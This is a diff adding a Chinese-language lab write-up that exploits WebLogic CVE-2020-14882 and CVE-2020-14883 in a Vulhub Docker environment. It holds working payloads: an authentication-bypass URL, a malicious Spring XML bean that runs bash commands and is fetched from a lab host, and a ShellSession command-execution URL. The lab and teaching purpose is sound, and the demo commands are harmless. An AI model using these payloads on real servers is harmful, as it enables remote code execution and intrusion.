@@ -101,3 +101,104 @@
 ![Alt text](image-16.png)   
 成功获取 `ssrf.php`源码。
 # 四、远程代码执行漏洞：Weblogic RCE。
+## 1. 环境搭建
+### 1.1 Vulhub
+* Vulhub：https://vulhub.org   
+![Alt text](image-17.png)
+### 1.2 下载安装
+* 说明：下载之前，需要 `docker` 和 `docker-compose`。（之前安装过，这里不再安装，详细可以查看文档：https://vulhub.org/#/docs/install-docker/）   
+```txt
+ docker-compose 操作容器：
+ 停止：docker-compose stop
+ 开启：docker-compose start
+ 移除：docker-compose down
+```
+下载：
+```url
+ git clone https://github.com/vulhub/vulhub.git
+```
+* 问题：可以访问git，但是clone不了！   
+* 解决：设置git代理，命令如下，端口为系统代理端口。   
+```shell
+  # 设置代理
+  git config --global http.proxy 127.0.0.1:1087
+  # 取消代理
+  git config --global --unset http.proxy
+```
+![Alt text](image-18.png)
+### 1.3 查看容器配置文件
+![Alt text](image-20.png)
+### 1.4 启动 `Weblogic` 漏洞环境
+进入制定漏洞目录下：
+![Alt text](image-19.png)   
+运行下方命令，启动容器。
+```shell
+ docker-compose up -d
+```
+![Alt text](image-21.png)
+### 1.5 访问
+```url
+ http://127.0.0.1/console
+```
+![Alt text](image-22.png)
+## 2.漏洞实战
+### 2.1 思路
+* 影响范围：   
+```text
+ WebLogic 10.3.6.0.0
+ WebLogic 12.1.3.0.0
+ WebLogic 12.2.1.3.0
+ WebLogic 12.2.1.4.0
+ WebLogic 14.1.1.0.0
+```
+* 目的：远程命令执行。   
+* 利用思路：首先利用 `Weblogic` 的 `CVE-2020-14882` 越权访问后台，然后再利用 `CVE-2020-14883` 实现远程命令执行。    
+### 2.2 越权访问后台页面
+```url
+ http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal
+```
+![Alt text](image-23.png)
+### 2.3 远程命令执行
+#### 2.3.1 方式一
+借助 `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` 类实现，此方式具有通杀性。
+##### 2.3.1.1 构造恶意xml文件，通过 `dvwa` 文件上传漏洞上传到容器内。
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xsi:schemaLocation="http://www.springframework.org/schema/beans
+http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>bash</value>
+        <value>-c</value>
+        <value><![CDATA[touch /tmp/info.txt]]></value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
+```
+![Alt text](image-24.png)
+![Alt text](image-25.png)
+![Alt text](image-26.png)
+##### 2.3.1.2 访问下面链接，使其可以访问到刚才构造的恶意 `touch.xml`
+```url
+ http://127.0.0.1:7001/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.17.101:8081/hackable/uploads/touch.xml")
+```
+* 问题：访问xml文件的路径不能输入`127.0.0.1`，因为这个是在容器内执行访问，那么就相当于容器的本机，然而容器的本机并没有这个文件。   
+* 解决：设置宿主机的ip，通过宿主机ip端口转发至文件所在 `dvwa` 容器内，就可以访问到特定资源。
+![Alt text](image-27.png)
+##### 2.3.1.3 进入 `Weblogic` 容器，检验命令是否执行成功
+![Alt text](image-28.png)
+#### 2.3.2 方式二
+借助 `com.tangosol.coherence.mvel2.sh.ShellSession` 类实现，此方式仅对 12.2.1 以上版本有用。
+##### 2.3.2.1 访问下面链接
+```url
+ http://127.0.0.1:7001/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/info1.txt');")
+```
+![Alt text](image-29.png)
+##### 2.3.2.2 进入 `Weblogic` 容器，检验命令是否执行成功
+![Alt text](image-30.png)   
+### 2.4 总结
+从此漏洞可以深刻体会到“没有绝对的安全”这句话的意义，利用后台的越权访问漏洞使得站点的攻击面增大，攻击者在不登录的情况下就可以轻松利用`CVE-2020-14883`的漏洞，实现远程命令执行。就此攻击链来看，越权访问是"门"，远程命令执行是"点"，因为"门"的失效，大大扩大了"点"的面积，使其更容易被发现和利用。
